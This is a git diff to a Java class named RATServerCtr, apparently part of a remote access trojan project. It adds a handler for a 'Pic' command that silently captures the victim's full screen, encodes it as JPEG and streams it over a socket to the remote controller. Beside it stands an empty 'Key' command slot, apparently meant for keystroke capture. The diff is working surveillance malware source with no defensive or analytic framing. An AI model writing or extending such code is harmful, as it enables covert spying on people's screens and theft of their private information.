@@ -1,6 +1,12 @@
 package controllers;
 
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -10,8 +16,10 @@ import java.io.ObjectOutputStream;
 import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Arrays;
+import javax.imageio.ImageIO;
 import views.RATServerView;
 
 /**
@@ -59,7 +67,9 @@ public class RATServerCtr {
             new RATServerView().showMessage(mode);
             switch (mode) {
                 case "Pic":
-                    
+                    sendResult("ok");
+                    //System.out.println(mode);
+                    sendPic();
                     break;
                 case "Key":
                     
@@ -95,6 +105,22 @@ public class RATServerCtr {
             DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
             dout.writeUTF(res);
         } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public void sendPic() throws IOException {
+        try {
+            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
+            BufferedImage screencap = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ImageIO.write(screencap,"jpg",baos);
+            
+            int size = baos.size();
+            dout.writeInt(size);
+            dout.write(baos.toByteArray());
+            dout.flush();
+        }catch(Exception e) {
             e.printStackTrace();
         }
     }
